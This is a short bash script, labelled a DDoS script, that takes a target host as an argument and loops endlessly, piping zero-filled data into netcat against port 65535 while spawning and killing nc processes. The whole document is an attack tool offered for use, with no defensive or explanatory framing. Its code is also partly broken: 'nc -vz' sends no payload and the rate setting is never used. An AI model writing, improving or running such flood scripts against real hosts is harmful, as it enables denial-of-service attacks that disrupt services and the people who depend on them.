
#!/bin/bash
# DDOS Script
# This script will launch a simple DDOS attack against a specified target

TARGET=$1
PACKET_SIZE=1024
RATE=1000

while true; do
    echo "Starting attack on $TARGET..."
    while :; do
        dd if=/dev/zero bs=$PACKET_SIZE count=1 | nc -vz $TARGET 65535 &
        sleep 0.001
        pkill -f 'nc.*65535'
    done
done
